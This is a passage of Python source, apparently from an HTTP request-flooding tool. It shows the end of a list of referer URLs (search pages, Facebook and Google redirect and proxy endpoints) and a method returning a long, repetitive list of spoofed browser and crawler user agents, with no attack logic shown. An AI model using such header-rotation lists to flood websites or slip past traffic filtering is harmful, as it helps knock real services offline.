                    'https://steamcommunity.com/market/search?q=', 'http://filehippo.com/search?q=',
                    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
                    'http://eu.battle.net/wow/en/search?q=',
                    'http://engadget.search.aol.com/search?q=', 'http://careers.gatesfoundation.org/search?q=',
                    'http://techtv.mit.edu/search?q=', 'http://www.ustream.tv/search?q=',
                    'http://www.ted.com/search?q=',
                    'http://funnymama.com/search?q=', 'http://itch.io/search?q=', 'http://jobs.rbs.com/jobs/search?q=',
                    'http://taginfo.openstreetmap.org/search?q=', 'http://www.baoxaydung.com.vn/news/vn/search&q=',
                    'https://play.google.com/store/search?q=', 'http://www.tceq.texas.gov/@@tceq-search?q=',
                    'http://www.reddit.com/search?q=', 'http://www.bestbuytheater.com/events/search?q=',
                    'https://careers.carolinashealthcare.org/search?q=', 'http://jobs.leidos.com/search?q=',
                    'http://jobs.bloomberg.com/search?q=', 'https://www.pinterest.com/search/?q=',
                    'http://millercenter.org/search?q=', 'https://www.npmjs.com/search?q=',
                    'http://www.evidence.nhs.uk/search?q=', 'http://www.shodanhq.com/search?q=',
                    'http://ytmnd.com/search?q=',
                    'http://www.google.com/?q=', 'http://www.google.com/?q=', 'http://www.google.com/?q=',
                    'http://www.usatoday.com/search/results?q=', 'http://engadget.search.aol.com/search?q=',
                    'https://steamcommunity.com/market/search?q=', 'http://filehippo.com/search?q=',
                    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
                    'http://eu.battle.net/wow/en/search?q=',
                    'http://engadget.search.aol.com/search?q=', 'http://careers.gatesfoundation.org/search?q=',
                    'http://techtv.mit.edu/search?q=', 'http://www.ustream.tv/search?q=',
                    'http://www.ted.com/search?q=',
                    'http://funnymama.com/search?q=', 'http://itch.io/search?q=', 'http://jobs.rbs.com/jobs/search?q=',
                    'http://taginfo.openstreetmap.org/search?q=', 'http://www.baoxaydung.com.vn/news/vn/search&q=',
                    'https://play.google.com/store/search?q=', 'http://www.tceq.texas.gov/@@tceq-search?q=',
                    'http://www.reddit.com/search?q=', 'http://www.bestbuytheater.com/events/search?q=',
                    'https://careers.carolinashealthcare.org/search?q=', 'http://jobs.leidos.com/search?q=',
                    'http://jobs.bloomberg.com/search?q=', 'https://www.pinterest.com/search/?q=',
                    'http://millercenter.org/search?q=', 'https://www.npmjs.com/search?q=',
                    'http://www.evidence.nhs.uk/search?q=', 'http://www.shodanhq.com/search?q=',
                    'http://ytmnd.com/search?q=',
                    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
                    'http://www.google.com/?q=', 'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
                    'https://drive.google.com/viewerng/viewer?url=', 'http://www.google.com/translate?u=',
                    'https://developers.google.com/speed/pagespeed/insights/?url=',
                    'http://help.baidu.com/searchResult?keywords=', 'http://www.bing.com/search?q=',
                    'https://add.my.yahoo.com/rss?url=', 'https://play.google.com/store/search?q=',
                    'http://www.google.com/?q=',
                    'http://www.usatoday.com/search/results?q=', 'http://engadget.search.aol.com/search?q=']
        return referers
    def obtain_user_agents(self):
        user_agents = ['Mozilla/5.0 (Amiga; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
               'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en-US; rv:1.8.1.21) Gecko/20090303 SeaMonkey/1.1.15',
               'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
               'Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
               'Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0',
               'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.1) Gecko/20061220 BonEcho/2.0.0.1',
               'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.10) Gecko/20071128 BonEcho/2.0.0.10',
               'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.17) Gecko/20080831 BonEcho/2.0.0.17',
               'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.6) Gecko/20070731 BonEcho/2.0.0.6',
               'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
